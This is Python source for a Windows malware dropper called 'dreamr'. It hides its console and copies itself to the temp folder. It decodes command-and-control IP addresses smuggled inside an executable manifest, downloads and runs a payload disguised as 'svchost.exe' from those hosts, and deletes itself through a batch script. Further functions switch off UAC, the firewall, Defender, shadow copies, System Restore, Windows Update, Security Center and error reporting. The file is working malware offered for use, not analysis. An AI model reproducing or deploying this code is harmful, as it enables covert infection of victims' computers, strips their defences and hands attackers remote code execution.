import os
import sys
import win32event
import win32api
import win32console
import win32gui
import winerror
import urllib2
import hashlib
import tempfile
import base64
import subprocess
import socket
import binascii
import time

from shutil import copyfile
from xml.dom.minidom import parseString

# Microsoft's MT binary goes here. Not included out of respect for Microsoft ;]
MT_B64 = ''''''
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, False)

# Melt Implant
def melt(filename):
	# Try and make the dreamr danger mutex to warn other implants
	try:
		mutex = win32event.CreateMutex(None, True, "dreamr-melting")
	except:
		pass

	countdown = 3
	while countdown > 0:
		countdown -= 1
		print("the implant will melt in %s seconds" % countdown)
		time.sleep(1)

	batchName = "mlt.bat"
	batch = open(batchName, "w")
	batch.write("@echo off\n")
	batch.write("ping 127.0.0.1 -n 2\n")
	batch.write("del dreamr.exe\n")
	batch.write("rd /S /Q www\n")
	batch.write("rd /S /Q cert\n")
	batch.write("del mt.exe\n")
	batch.write("del drm.txt\n")
	batch.write("del \"%s\"\n" % filename)
	batch.write("del \"%s\"\n" % sys.argv[0])
	batch.write("start \"\" \"svchost.exe\"\n")
	batch.write("del \"%s\"\n" % batchName)
	batch.close()
	subprocess.Popen([batchName])
	return

# Check mutex to detect multilaunch
if (len(sys.argv) == 1):
	mutex = win32event.CreateMutex(None, 1, "dreamr")
	if (win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS):
		melt(os.path.basename(sys.argv[0]))
		os._exit(420)

# Check mutex to detect multilaunch
if (len(sys.argv) == 1):
	mutex = win32event.CreateMutex(None, 1, "dreamcatchr")
	if (win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS):
		melt(os.path.basename(sys.argv[0]))
		os._exit(420)

# Move self into temp
tempdir = tempfile.gettempdir()
try:
	print("move %s -> %s" % (sys.argv[0], "%s\\dreamr.exe" % tempdir))
	copyfile(sys.argv[0], "%s\\dreamr.exe" % tempdir)
except Exception as e:
	print("%s" % str(e))

os.chdir(tempdir)

# execute and forget
def execute(program, arglist, shell):
	cmd = [ program ]
	for arg in arglist:
		cmd.append(arg)
	try:
		handle = subprocess.Popen(cmd, shell=shell, stdout=subprocess.PIPE)
	except Exception as e:
		print("failed to execute file -> %s" % str(e))
	return

def decodeHostlistManifest(manifest):
	packedHosts = []

	# Parse XML until we find the "public key"
	dom = parseString(manifest)
	assemblyIdentity = dom.getElementsByTagName("assemblyIdentity")
	for el in assemblyIdentity:
		if el.attributes['publicKeyToken'].value:
			packedHosts = str.split(str(el.attributes['publicKeyToken'].value), "-")
			break

	# Test each host
	if (packedHosts):
		hostlist = []
		for packedHost in packedHosts:
			try:
				hostlist.append(socket.inet_ntoa(binascii.unhexlify(packedHost)))
			except Exception as e:
				print("corrupted hostlist -> %s" % str(e))
	return hostlist

# Dumps the hostlist manifest from a binary (using mt.exe)
def extractHostListManifest():
	try:
		# Write MT tool to disk
		mtBytes = base64.b64decode(MT_B64)
		with open("mt.exe", "wb") as handle: # exec skipped on write fail, write fail on bin already running
			handle.write(mtBytes)

		# Change into temp dir and extract the manifest
		execute("mt.exe", ("-inputresource:dreamr.exe;1", "-out:dreamr.txt"), False)
		time.sleep(1)
		with open("dreamr.txt", "r") as handle:
			return handle.read()
	except Exception as e:
		print("error extract manifest -> %s" % str(e))

# Download the package
def downloadFile(url, filename):
	try:
		print("download file http")
		web = urllib2.urlopen(url)
		meta = web.info()
		totalSize = long(meta.getheaders("Content-Length")[0])
		block = 8192

		# Download the file from the remote server
		print "Fetch: %s (%sB)" % (filename, totalSize)
		try:
			with open(filename, "wb") as fhandle:
				currentSize = 0
				fhandle.write(web.read())
		except Exception as e:
			print("failed download file -> %s" % str(e))

		# dummy check
		if os.path.getsize(filename) > 1600000:
			return True
	except:
		pass
	return False

def byeUAC():
	execute("reg", ("add", "HKLM\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f"), False)

# Keep hidden file setting toggled off
def byeHiddenFiles():
	execute("reg", ("add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "/v", "NoFolderOptions", "/t", "REG_DWORD", "/d", "1", "/f"), False)

# Firewall FTL
def byeFirewall():
	execute("netsh", ("firewall", "set", "opmode", "disable"), False)

def byeNotify():
	execute("reg", ("add", "HKCU\\SOFTWARE\\Microsoft\\Security Center", "/v", "FirewallDisableNotify", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("reg", ("add", "HKLM\\SOFTWARE\\Microsoft\\Security Center", "/v", "FirewallDisableNotify", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("reg", ("add", "HKLM\\System\\CurrentControlSet\\Services\\wscsvc", "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"), False)
	execute("sc", ("stop", "wscsvc"), False)
	time.sleep(1)
	execute("sc", ("delete", "wscsvc"), False)

def byeErrorReporting():
	execute("reg", ("add", "HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting", "/v", "Disabled", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("reg", ("add", "HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting", "/v", "DontSendAdditionalData", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("reg", ("add", "HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting", "/v", "LoggingDisabled", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("reg", ("add", "HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting", "/v", "Disabled", "/t", "REG_DWORD", "/d", "1", "/f"), False)

# VSS Disable (Admin)
def byeShadowing():
	execute("reg", ("add", "HKLM\\System\\CurrentControlSet\\Services\\vss", "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"), False)
	execute("sc", ("stop", "srservice"), False)

# System Restore Disable
def byeSystemRestore():
	execute("reg", ("add", "HKLM\\System\\CurrentControlSet\\Services\\srservice", "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"), False)
	execute("reg", ("add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "/v", "DisableSR", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("sc", ("stop", "srservice"), False)

# Windows Update Disable
def byeWindowsUpdate():
	execute("reg", ("add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "/v", "NoAutoUpdate", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("sc", ("stop", "Windows Update"), False)

# Windows Defender/Sample Submission Disable
def byeDefender():
	execute("reg", ("add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"), False)

# Windows Binary Tracking Disable
def byeTelemetry():
	execute("reg", ("add", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"), False)
	execute("reg", ("add", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"), False)
	execute("reg", ("add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection", "/v", "AllowTelemetry", "/t", "REG_DWORD", "/d", "0", "/f"), False)
	execute("sc", ("delete", "DiagTrack"), False)
	execute("sc", ("delete", "dmwappushservice"), False)

try:
	hostlist = decodeHostlistManifest(extractHostListManifest())
	if hostlist:

		# Write sleeping.hosts
		with open("sleeping.hosts", "wa") as handle:
			for host in hostlist:
				handle.write("%s\n" % host)

		# With hostlist
		i = 0
		while (i <33):
			for host in hostlist:
				print("bootstrap from: http://%s:8000/svchost.exe" % host)
				if (downloadFile("http://%s:8000/svchost.exe" % host, "svchost.exe")):
					melt("dreamr.exe")
					os._exit(420) # proc started in melt for "fork"
				else:
					os.remove("svchost.exe")
					print("download fail -> try next")
		time.sleep(10)
		i += 1
	else:
		melt("dreamr.exe")
		os._exit(420)
except:
	pass